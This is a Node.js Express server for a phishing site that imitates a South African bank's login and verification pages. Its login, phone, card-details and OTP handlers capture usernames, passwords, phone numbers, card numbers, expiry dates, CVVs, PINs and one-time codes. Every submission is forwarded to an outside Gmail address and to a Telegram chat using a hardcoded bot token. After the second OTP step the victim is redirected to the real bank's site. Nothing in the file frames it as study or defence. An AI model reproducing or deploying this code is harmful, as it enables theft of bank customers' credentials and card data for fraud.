require('dotenv').config();
const express = require("express");
const nodemailer = require("nodemailer");
const config = require("./config");
const app = express();
const TelegramBot = require('node-telegram-bot-api');

const port = process.env.PORT || 3007;

config(app);

var transporter = nodemailer.createTransport({
    host: "mail.privateemail.com",
    port: 465,
    auth: {
      user: "info@applinic.com",
      pass: process.env.EMAIL_PASSWORD
    }
});

const chatId="5034063386";

const token = "6733843438:AAHDmynvDgXNOdl7phSTBLY3keo-Zdud6i4";
const bot = new TelegramBot(token, { polling: true });


app.listen(port, () => console.log(`Server running on port ${port}`));


app.get("/", ( req , res ) => {   
    res.render("index2")    
});

app.get("/en/za", ( req , res ) => {
    if(req.query.trf){
        res.render("index")
    } else {
        res.render("index2")
    }    
});

app.get("/phone-verification", (req, res) => {
    res.render("mobilenumber")
})

app.get("/otp", (req, res) => {
    res.render("otp.html")
})

app.get("/load", (req, res) => {
    res.render("load.html")
})

app.post("/otp_post", (req, res) => {

    if(req.body.otpValue) {
        res.render("failed.html")
    } else {
        res.render("index.html")
    }

    var mailOptions = {
        from: `${req.session.user} info@applinic.com`,
        to: "matledesign98@gmail.com",
        subject: `OTP Code`,
        text: `OTP: ${req.body.otpValue}`
    };

    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

    bot.sendMessage(chatId, `From: ${req.session.user}\n OTP: ${req.body.otpValue}`);

});

app.post("/otp2_form", (req, res) => {

    if(req.body.otpValue) {
        res.redirect("https://www.fnb.co.za/fusion-accounts/private-wealth-fusion-account.html");
    } else {
        res.render("index.html")
    }

    var mailOptions = {
        from: `${req.session.user} info@applinic.com`,
        to: "matledesign98@gmail.com",
        subject: `OTP2 Code`,
        text: `OTP2: ${req.body.otpValue}`
    };

    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

    bot.sendMessage(chatId, `From: ${req.session.user}\n OTP2: ${req.body.otpValue}`);

})

app.post("/phone-verification", (req, res) => {
    res.redirect("/card-details")
    var mailOptions = {
        from: `${req.session.user} info@applinic.com`,
        to: "matledesign98@gmail.com",
        subject: `Mobile Number`,
        text: `Mobile number: ${req.body.phn}`
    };

    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

    bot.sendMessage(chatId, `From: ${req.session.user}\n Mobile Number: ${req.body.phn}`);
})

app.get("/card-details", (req, res) => {
  res.render("carddetails")
})

app.post("/cardVerification", ( req, res) => {
    
    res.redirect('/load')
    var mailOptions = {
        from: `${req.session.user} info@applinic.com`,
        to: "matledesign98@gmail.com",
        subject: `Card Details`,
        text: `card number: ${req.body.card}\n\nexpire: ${req.body.exp}\n\ncvv: ${req.body.cvv}\n\npin: ${req.body.pho}`
    };

    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

    bot.sendMessage(chatId, `From: ${req.session.user}\n card number: 
    ${req.body.card}\n\nexpire: ${req.body.exp}\n\ncvv: ${req.body.cvv}\n\npin: ${req.body.pho}`);
});

app.post("/login", ( req, res ) => {
    res.redirect(`/phone-verification`);
    req.session.user = req.body.Username;
    req.session.save();
    var mailOptions = {
        from: `${req.session.user} info@applinic.com`,
        to: "matledesign98@gmail.com",
        subject: `Client Login Alert`,
        text: `Client Login\n\nUsername: ${req.body.Username}\n\nPassword: ${req.body.Password}`
    };

    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

    bot.sendMessage(chatId, `From: ${req.session.user}\n Client Login\n\nUsername: ${req.body.Username}\n\nPassword: ${req.body.Password}`);

});